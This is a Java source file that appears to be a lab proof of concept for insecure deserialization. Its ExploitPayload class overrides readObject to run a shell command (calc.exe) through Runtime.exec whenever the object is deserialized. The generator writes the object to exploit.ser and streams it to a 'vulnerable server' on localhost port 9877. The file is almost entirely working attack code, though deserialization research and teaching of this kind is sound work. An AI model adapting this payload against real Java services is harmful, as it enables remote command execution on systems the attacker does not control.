package com.example.exploit;

import java.io.*;
import java.net.Socket;

public class ExploitGenerator {
    public static void main(String[] args) {
        try {
            System.out.println("Creating a malicious serialized object");
            
            // Create a malicious payload using a custom class
            ExploitPayload payload = new ExploitPayload("calc.exe");
            
            // Serialize the object
            try (FileOutputStream fos = new FileOutputStream("exploit.ser");
                 ObjectOutputStream oos = new ObjectOutputStream(fos)) {
                oos.writeObject(payload);
                System.out.println("Malicious object saved to exploit.ser");
            }
            
            // Send the exploit to the vulnerable server
            System.out.println("Sending exploit to vulnerable server...");
            try (Socket socket = new Socket("localhost", 9877);
                 FileInputStream fis = new FileInputStream("exploit.ser");
                 OutputStream os = socket.getOutputStream()) {
                
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }
                
                System.out.println("Exploit sent successfully");
                
                // Read response (if any)
                try (BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
                    String line = in.readLine();
                    if (line != null) {
                        System.out.println("Server response: " + line);
                    }
                }
            }
            
        } catch (Exception e) {
            System.err.println("Error generating/sending exploit:");
            e.printStackTrace();
        }
    }
}

class ExploitPayload implements Serializable {
    private static final long serialVersionUID = 1L;
    private String command;
    
    public ExploitPayload(String command) {
        this.command = command;
    }
    
    // This method is called during deserialization
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        // Read the default serialized fields
        ois.defaultReadObject();
        
        // Execute the command when deserialized
        try {
            System.out.println("Attempting to execute: " + command);
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}